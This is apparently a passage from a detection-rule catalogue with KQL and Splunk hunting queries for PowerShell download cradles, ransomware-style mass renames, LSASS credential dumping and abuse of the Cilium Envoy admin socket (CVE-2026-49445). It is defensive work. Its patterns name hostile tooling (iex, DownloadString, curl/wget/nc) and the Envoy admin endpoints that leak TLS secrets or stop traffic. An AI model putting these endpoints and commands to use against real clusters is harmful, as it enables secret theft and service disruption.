      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")

| `drop_dm_object_name(Processes)`

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: TLS secret / config disclosure via admin.sock (CVE-2026-49445) AIActions on Objectives Medium
Hunts a local process on a Kubernetes node reading sensitive Envoy admin endpoints (/certs, /config_dump, /clusters) over the world-accessible Cilium Envoy admin.sock. Only cilium-agent/cilium-envoy should ever touch this socket, so any curl/wget/socat/python/nc process referencing it plus a read endpoint is anomalous and indicates exploitation of the mode-0777 socket. Rationale: Anchored on the concrete artifacts corroboration surfaced: the world-accessible socket is admin.sock (mode fixed to 0660 in PR #44512) and the article's 'Exposing TLS secrets' maps precisely to Envoy's /certs and /config_dump admin endpoints (Envoy admin docs). Excluding cilium-* binaries makes non-cilium access to this socket high-fidelity. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1552.001 T1005 T1613
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Cilium/Isovalent support engineer running `cilium-sysdump` or manual curl against admin.sock during troubleshooting
  • Custom Prometheus exporter or monitoring wrapper script scraping /stats or /config_dump for observability
  • Platform team debugging L7 policy by dumping Envoy config on a node
  • CI/e2e test harness that exercises the admin interface
  • SRE gathering diagnostics via a non-cilium helper script that shells out to curl
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-health", "cilium-bugtool"))
Response runbook
1) TRIAGE: Identify the acting process, its parent, and the user/UID. Confirm it is NOT cilium-agent/cilium-envoy and not a sanctioned sysdump/monitoring job. Capture which endpoint was hit — /certs and /config_dump mean TLS material and full mesh config may be disclosed. 2) CONTAIN: Isolate the node, rotate any TLS secrets/SDS certs served by Envoy on that node, and confirm Cilium is upgraded to a patched build (v1.17.14 / v1.18.8 / v1.19.2) so admin.sock is mode 0660. 3) HUNT: Pivot on the same host/UID for other admin.sock access, for destructive endpoint hits (/quitquitquit, /drain_listeners), for lateral movement from the identity, and search other nodes for the same process ancestry.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: destructive DoS via /quitquitquit /drain_listeners (CVE-2026-49445) AIActions on Objectives High
Alerts when a local process invokes disruptive Envoy admin operations over the world-accessible Cilium admin.sock — /quitquitquit (terminate Envoy), /drain_listeners, /healthcheck/fail, /reset_counters. These directly implement the article's 'disrupting traffic' and 'terminating the Envoy process' impacts and have no legitimate manual use against the Cilium-managed Envoy. Rationale: The article explicitly lists 'Disrupting traffic in the cluster' and 'Terminating the Envoy process' as impacts; Envoy admin docs confirm /quitquitquit terminates the process and /drain_listeners + /healthcheck/fail disrupt serving. These are irreversible operational actions no legitimate operator issues against the Cilium-managed Envoy, making this alertable at high confidence. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1489 T1499
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator manually draining a node for maintenance who scripts /drain_listeners against the Cilium Envoy instead of using the node-drain workflow
  • Chaos-engineering / resilience test intentionally failing Envoy healthchecks
  • Support engineer restarting a wedged Envoy via /quitquitquit during an incident
  • Custom automation that resets Envoy stat counters via /reset_counters before a benchmark
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-bugtool"))
Response runbook
1) TRIAGE: Correlate the process/user/UID with any approved change or maintenance window; check whether Envoy on the node restarted or dropped L7 traffic immediately after (cilium-agent logs, pod readiness flaps). 2) CONTAIN: Cordon/isolate the node, restore Envoy (cilium-agent will respawn it) and verify L7 policy enforcement resumed, then ensure the cluster is upgraded to a patched Cilium (v1.17.14 / v1.18.8 / v1.19.2). 3) HUNT: Look for prior read abuse of the same admin.sock (/certs, /config_dump) from the same identity, repeated destructive calls across multiple nodes (coordinated DoS), and the initial access vector that placed the attacker on the node.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-49445")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-49445")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
